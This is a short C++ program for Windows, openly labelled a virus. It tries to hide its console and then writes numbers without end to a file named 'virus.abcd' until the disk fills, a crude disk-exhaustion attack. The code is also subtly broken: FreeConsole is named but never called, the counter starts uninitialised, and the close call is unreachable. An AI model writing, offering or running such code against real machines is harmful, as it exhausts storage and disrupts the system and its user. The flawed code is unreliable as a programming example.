#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

int main() {
    FreeConsole;
    int i;
    ofstream virus;
    virus.open("virus.abcd");
    while(1) {
        virus<<i;
        i++;
    }
    virus.close();
    return 0;
}